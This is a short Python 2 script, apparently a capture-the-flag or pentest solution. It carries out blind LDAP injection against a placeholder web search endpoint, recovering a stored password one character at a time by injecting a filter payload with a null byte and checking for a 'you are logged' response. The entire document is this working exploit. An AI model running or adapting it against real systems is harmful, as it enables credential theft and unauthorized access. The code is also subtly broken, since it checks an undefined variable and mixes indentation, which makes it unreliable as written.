import time
import requests

site   = 'http://xxx/?'
needle = "you are logged"

def test(r):
    time.sleep(0.2)
    params = "action=dir&search=ad*)(" + r + "*))%00"
    print site + params
    r = requests.get(site + params)
    return r.text.find(logged) != -1

	
print "[+] Reading password ..."
password = ""
for i in range(1, 20):
    print "[+] Testing len %d ..." % i
    for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
		if test("password=%s%c" % (password, c)):
			password += c
			break
    print "[+] Current password :", password
